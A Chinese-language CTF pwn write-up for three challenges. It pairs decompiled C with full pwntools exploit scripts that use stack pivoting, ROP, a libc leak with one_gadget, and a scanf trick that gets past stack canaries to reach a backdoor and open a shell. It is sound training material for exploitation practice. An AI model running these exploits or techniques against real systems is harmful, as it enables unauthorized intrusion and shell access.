# 原神

`stack pivoting`+`rop`

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  unsigned int v3; // eax
  char s; // [rsp+0h] [rbp-30h]
  int v6; // [rsp+2Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  memset(&s, 0, 0x20uLL);
  v3 = time(0LL);
  srand(v3);
  puts(&byte_400FF8);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts(&byte_401030);
        scanf("%d", &v6);
        if ( v6 != 1 )
          break;
        sub_400877(1LL);
      }
      if ( v6 != 2 )
        break;
      sub_400877(10LL);
    }
    if ( v6 == 3 )
      break;
    puts(&byte_401063);
  }
  printf(
    &byte_401078,
    (unsigned int)dword_60230C,
    (unsigned int)dword_602310,
    (unsigned int)dword_602314,
    (unsigned int)dword_602318,
    (unsigned int)dword_60231C);
  scanf("%d", &v6);
  if ( v6 == 1 )
  {
    puts(&byte_401118);
    read(0, &s, 0x58uLL);
    puts(&byte_401131);
  }
  system("echo Bye~!");
  close(1);
  return 0LL;
}
```

抽卡模拟器，在最后选择抽卡会进入有read栈溢出的语句中。但是溢出的长度不够，所以我们要进行栈迁移。

这里close(1)，关闭了stdout所以write和puts都不会有回显，所以想到将栈迁移到bss段。

由于我们在bss段没有提前布置栈帧结构，所以还要再read一次，汇编指令确定参数的位置是rbp+offset，所以fake rbp后写入main中read的地址。通过main中的leave ret完成完整的栈迁移。

之后在新栈写入“/bin/sh”并调用system。stdout关闭了，普通的cat flag没有回显，所以要"cat flag >&2"

## exp

```python
#!/usr/bin/env python3
from pwn import *

context.log_level='debug'
context.arch="amd64"
p= remote('219.152.60.100',54232)
#p=process('./pwn')
elf=ELF('./pwn')
offset=0x30
pop_rdi=0x400d13
system_addr=0x0400C8C
sys_plt=0x400700
sys_got=elf.got['system']
bss_start=0x602000+0x308+0x400
read_addr=0x400c63
leave=0x0000000000400b24
p.sendlineafter('[3]结束抽卡','3')
p.sendlineafter('[2]退出','1')
cmd="/bin/sh\x00"
payload=flat('a'*offset,bss_start+0x10,read_addr,'\x00'*24)
#gdb.attach(p)
p.sendafter('的名字：',payload)
payload=flat('\x00'*(0x30+8),pop_rdi,bss_start+0x30,sys_plt,cmd)
p.send(payload)

p.interactive()
```

注意别用sendline，我调了很长时间，sendline会改变一些重要函数所需参数。

# keer‘s bug

`stack piovting`+`rop`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[80]; // [rsp+0h] [rbp-50h]

  memset(s, 0, 0x50uLL);
  write(1, "Come on!! You can ri keer!!!\n", 0x1DuLL);
  read(0, s, 0x70uLL);
  return 0;
}
```

看一个明显的栈溢出，本应该是八仙过海的一道题，可是环境有点不行。与群里师傅讨论了一下这里至少有三种实现get shell的方法（普通rop，ret2libc_init，ret2dl_run_time）。

## exp

```python
#!/usr/bin/env python3
from pwn import *
context.log_level='debug'
context.arch="amd64"

local=1
if local:
	r=process('./pwn')	
else:
	r=remote('node2.hackingfor.fun',30238)
#gdb.attach(r)
elf=ELF('./pwn')
offset=0x50
fake_rbp=0x601060+0x100
pop_rdi=0x400673
pop_rsi_r15=0x400671
leave_ret=0x40060d
main_addr=0x4005d4
write_got=elf.got['write']
write_plt=elf.plt['write']
payload='a'*offset+p64(fake_rbp)+p64(main_addr)
r.send(payload)
sleep(0.1)

payload=p64(pop_rdi)+p64(0x1)+p64(pop_rsi_r15)+p64(write_got)+p64(0x8)+p64(write_plt)+p64(elf.symbols['main'])
payload=payload.ljust(0x50,'a')+p64(fake_rbp-0x58)+p64(leave_ret)
r.send(payload)

write_addr=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.info("addr:"+hex(write_addr))
libcbase=write_addr-0x0f7370
binsh_addr=libcbase+0x18ce17
system_addr=libcbase+0x0453a0
one_gadget=libcbase+0x45226
#payload='a'*0x58+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
payload='a'*0x58+p64(one_gadget)
r.send(payload)
r.interactive()
```

# pwngirl

不废话直接进入有漏洞的函数

```c
unsigned __int64 sub_4008E5()
{
  __int64 v0; // rsi
  int v2; // [rsp+4h] [rbp-4Ch]
  unsigned int i; // [rsp+8h] [rbp-48h]
  int j; // [rsp+Ch] [rbp-44h]
  int k; // [rsp+10h] [rbp-40h]
  int v6; // [rsp+14h] [rbp-3Ch]
  int v7; // [rsp+18h] [rbp-38h]
  int v8; // [rsp+1Ch] [rbp-34h]
  int base[10]; // [rsp+20h] [rbp-30h]
  unsigned __int64 v10; // [rsp+48h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  v6 = 0;
  v7 = 999;
  puts("how many girlfriends do you have?");
  __isoc99_scanf("%d", &v2);
  for ( i = 0; (signed int)i < v2; ++i )
  {
    printf("please input your %dth girlfriends:", i);
    __isoc99_scanf("%d", &base[i]);
  }
  if ( v7 != 999 )
    exit(0);
  v0 = v2;
  qsort(base, v2, 4uLL, compar);
  printf("this is the sort result:", v0);
  for ( j = 0; j < v2; ++j )
    printf("%d  ", (unsigned int)base[j]);
  puts("you can change your girlfriend");
  __isoc99_scanf("%d", &v2);
  v8 = v2;
  if ( !v2 )
  {
    printf("which girlfriend do you want to change?", &v2);
    __isoc99_scanf("%d", &v2);
    for ( k = 0; k < v2; ++k )
    {
      puts("now change:");
      __isoc99_scanf("%lld", &base[k]);
    }
  }
  if ( v2 <= 79 && v2 > 39 )
    qsort(base, v2, 4uLL, compar);
  if ( v2 <= 100 && v2 > 80 )
    qsort(base, v2, 4uLL, compar);
  if ( v2 <= 64 && v2 > 55 )
    qsort(base, v2, 4uLL, compar);
  if ( v2 <= 100 )
  {
    if ( v2 <= 27 || v2 > 39 )
    {
      if ( v2 <= 26 )
        qsort(base, v2, 4uLL, compar);
    }
    else
    {
      qsort(base, v2, 4uLL, compar);
    }
  }
  else
  {
    qsort(base, v2, 4uLL, compar);
  }
  return __readfsqword(0x28u) ^ v10;
}
```

有canary保护，但是有数组超界还有后门函数。输入girlfirends数量会进行排序，没用控制v2的大小。

qsort会改变数组顺序，int大小为四字节，经计算canary在第11，12个参数，ret address是第15个。

第一次输入一个小的数，例如1，2，保证canary不会被修改。

第二次change，写入27就不会进行排序，修改ret就能直接到达后门函数了。

## exp

```python
.log_level='debug'
context.arch="amd64"
#p= remote('219.152.60.100',54232)
p=process('./pwn')
elf=ELF('./pwn')

backdoor=0x400C04
#gdb.attach(p)
p.sendline('@')
p.sendline('^')
p.sendline('aa')
p.sendlineafter("how many girlfriends do you have?",'1')
p.sendlineafter("th girlfriends:",'1')

p.sendlineafter("you can change your girlfriend",'0')
p.sendlineafter("which girlfriend do you want to change?",'27')
for i in range(14):
	p.sendlineafter("now change:",'-')
p.sendlineafter("now change:",'4197380')
for i in range(27-15):
	p.sendlineafter("now change:",'-')

p.interactive()
```

## scanf

1、scanf("%u",&num);
如果题目存在数组越界，但是开了canary保护，可以通过输入带符号整数来绕过canary

如果输入带符号整数，可以不写入数据，scanf直接ret

 例如：-456465、+12313

 2、scanf("%d",&num);

 如果题目存在数组越界，但是开了canary保护，可以通过输入负号来绕过canary

 如果输入负号，可以不写入数据，scanf直接ret

 例如：-

 3、堆题构造libc地址

 Ubuntu16.04在已经存在free的fastbin的时候输入0x401个数字，就可以在fastbin中写入libc，如果存在uaf漏洞，就可以实现libc leak